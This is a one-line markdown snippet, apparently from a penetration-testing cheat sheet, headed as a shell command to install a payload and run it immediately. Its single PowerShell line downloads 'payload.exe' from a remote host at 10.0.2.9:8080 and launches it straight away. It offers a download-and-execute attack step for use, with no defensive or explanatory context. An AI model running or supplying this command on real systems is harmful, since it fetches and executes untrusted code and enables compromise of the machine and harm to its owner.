## Shell command line for install payload and run immediately

```
Invoke-WebRequest -Uri "http://10.0.2.9:8080/test/exe" -OutFile "payload.exe" ; Start-Process ".\payload.exe"
```
